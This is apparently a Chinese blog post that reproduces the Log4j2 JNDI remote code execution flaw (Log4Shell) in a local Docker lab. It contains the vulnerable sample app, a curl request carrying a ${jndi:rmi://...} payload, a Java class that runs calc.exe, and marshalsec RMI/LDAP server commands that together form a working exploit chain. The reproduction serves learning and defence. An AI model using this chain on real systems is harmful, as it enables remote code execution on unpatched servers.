\documentclass[12pt]{article}
\usepackage{latexblog}

% ============================================================
% Blog Metadata
% ============================================================
\blogtitle{Log4j远程代码执行漏洞的复现}
\blogdate{2021-12-10}
\blogtags{安全, 闲话编程}
\bloglang{zh}
\blogsummary{}

\begin{document}
\makeblogtitle

Log4j2突然爆出个大漏洞，闹得全世界都在修这个问题。但这个问题到底能不能复现出来呢？花了一些时间，终于折腾出来了。

\section{如何复现}\label{ux5982ux4f55ux590dux73b0}

\subsection{准备复现环境}\label{ux51c6ux5907ux590dux73b0ux73afux5883}

已经有安全平台准备了测试的docker镜像：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{docker}\NormalTok{ run }\AttributeTok{{-}d} \AttributeTok{{-}P}\NormalTok{ vulfocus/log4j2{-}rce{-}2021{-}12{-}09:latest}
\end{Highlighting}
\end{Shaded}

反编译看了一下里面的内容，其实特别简单：

\begin{Shaded}
\begin{Highlighting}[]
\AttributeTok{@SpringBootApplication}
\AttributeTok{@RestController}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ Log4j2RceApplication }\OperatorTok{\{}
    \KeywordTok{private} \DataTypeTok{static} \DataTypeTok{final} \BuiltInTok{Logger}\NormalTok{ logger }\OperatorTok{=} \BuiltInTok{LogManager}\OperatorTok{.}\FunctionTok{getLogger}\OperatorTok{(}\NormalTok{Log4j2RceApplication}\OperatorTok{.}\FunctionTok{class}\OperatorTok{);}

    \KeywordTok{public} \FunctionTok{Log4j2RceApplication}\OperatorTok{()} \OperatorTok{\{}
    \OperatorTok{\}}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{main}\OperatorTok{(}\BuiltInTok{String}\OperatorTok{[]}\NormalTok{ args}\OperatorTok{)} \OperatorTok{\{}
\NormalTok{        SpringApplication}\OperatorTok{.}\FunctionTok{run}\OperatorTok{(}\NormalTok{Log4j2RceApplication}\OperatorTok{.}\FunctionTok{class}\OperatorTok{,}\NormalTok{ args}\OperatorTok{);}
    \OperatorTok{\}}

    \AttributeTok{@PostMapping}\OperatorTok{(\{}\StringTok{"/hello"}\OperatorTok{\})}
    \KeywordTok{public} \BuiltInTok{String} \FunctionTok{hello}\OperatorTok{(}\BuiltInTok{String}\NormalTok{ payload}\OperatorTok{)} \OperatorTok{\{}
        \BuiltInTok{System}\OperatorTok{.}\FunctionTok{setProperty}\OperatorTok{(}\StringTok{"com.sun.jndi.ldap.object.trustURLCodebase"}\OperatorTok{,} \StringTok{"true"}\OperatorTok{);}
        \BuiltInTok{System}\OperatorTok{.}\FunctionTok{setProperty}\OperatorTok{(}\StringTok{"com.sun.jndi.rmi.object.trustURLCodebase"}\OperatorTok{,} \StringTok{"true"}\OperatorTok{);}
\NormalTok{        logger}\OperatorTok{.}\FunctionTok{error}\OperatorTok{(}\StringTok{"\{\}"}\OperatorTok{,}\NormalTok{ payload}\OperatorTok{);}
\NormalTok{        logger}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\StringTok{"\{\}"}\OperatorTok{,}\NormalTok{ payload}\OperatorTok{);}
\NormalTok{        logger}\OperatorTok{.}\FunctionTok{info}\OperatorTok{(}\NormalTok{payload}\OperatorTok{);}
\NormalTok{        logger}\OperatorTok{.}\FunctionTok{error}\OperatorTok{(}\NormalTok{payload}\OperatorTok{);}
        \ControlFlowTok{return} \StringTok{"ok"}\OperatorTok{;}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

当启动上面的程序后，直接调用就可以测试：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{curl} \AttributeTok{{-}{-}request}\NormalTok{ POST }\DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}{-}url}\NormalTok{ http://localhost:8080/hello }\DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}{-}header} \StringTok{\textquotesingle{}Content{-}Type: application/x{-}www{-}form{-}urlencoded\textquotesingle{}} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}{-}data} \StringTok{\textquotesingle{}payload=$\{jndi:rmi://localhost:1099/ExecTest\}\textquotesingle{}} \DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}{-}data}\NormalTok{ = }\DataTypeTok{\textbackslash{}}
  \AttributeTok{{-}{-}data}\NormalTok{ =}
\end{Highlighting}
\end{Shaded}

可以看到日志中打印出来JNDI相关的日志。但是我们的目标不仅于此，如何真正执行一些有意思的操作，比如开启个计算器？

\subsection{编写恶意代码}\label{ux7f16ux5199ux6076ux610fux4ee3ux7801}

准备一个简单的``恶意代码''，这个类在初始化的时候调用系统进程：

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{public} \KeywordTok{class}\NormalTok{ ExecTest }\OperatorTok{\{}
    \KeywordTok{public} \FunctionTok{ExecTest}\OperatorTok{()} \OperatorTok{\{}
        \ControlFlowTok{try} \OperatorTok{\{}
            \BuiltInTok{System}\OperatorTok{.}\FunctionTok{out}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}\StringTok{"You\textquotesingle{}re Hacked!!!"}\OperatorTok{);}
            \BuiltInTok{Runtime}\OperatorTok{.}\FunctionTok{getRuntime}\OperatorTok{().}\FunctionTok{exec}\OperatorTok{(}\StringTok{"calc.exe"}\OperatorTok{);}
        \OperatorTok{\}} \ControlFlowTok{catch} \OperatorTok{(}\BuiltInTok{Exception}\NormalTok{ e}\OperatorTok{)} \OperatorTok{\{}
\NormalTok{            e}\OperatorTok{.}\FunctionTok{printStackTrace}\OperatorTok{();}
        \OperatorTok{\}}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

将其编译为.class文件，并需要发布到网络地址上，最简单的是用Tomcat或者python来弄，比如：

\begin{Shaded}
\begin{Highlighting}[]
\BuiltInTok{cd}\NormalTok{ target/classes}
\ExtensionTok{python3} \AttributeTok{{-}m}\NormalTok{ SimpleHTTPServer }
\end{Highlighting}
\end{Shaded}

\subsection{启动RMI服务}\label{ux542fux52a8rmiux670dux52a1}

使用https://github.com/mbechler/marshalsec可以快速启动RMI 或者LDAP，这个工具需要自己编译：

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{mvn}\NormalTok{ clean package }\AttributeTok{{-}D}\StringTok{"maven.test.skip"}\OperatorTok{=}\NormalTok{true}
 \ExtensionTok{java} \AttributeTok{{-}cp}\NormalTok{ .}\DataTypeTok{\textbackslash{}m}\NormalTok{arshalsec{-}0.0.3{-}SNAPSHOT{-}all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/\#ExecTest}
 \CommentTok{\# java {-}cp marshalsec{-}0.0.3{-}SNAPSHOT{-}all.jar marshalsec.jndi.LDAPRefServer http://localhost:8080/\textbackslash{}\#ExecTest 1389}
\end{Highlighting}
\end{Shaded}

\subsection{测试}\label{ux6d4bux8bd5}

在之前的请求内容中填上RMI的地址，\$\{jndi:rmi://localhost:1099/ExecTest\} 调用成功后即可弹出计算器。

\begin{itemize}
\tightlist
\item
  https://nosec.org/home/detail/4917.html
\item
  https://github.com/apache/logging-log4j2/commit/7fe72d6
\item
  https://securityboulevard.com/2021/12/log4shell-jndi-injection-via-attackable-log4j/
\item
  https://nvd.nist.gov/vuln/detail/CVE-2021-44228
\end{itemize}


\end{document}
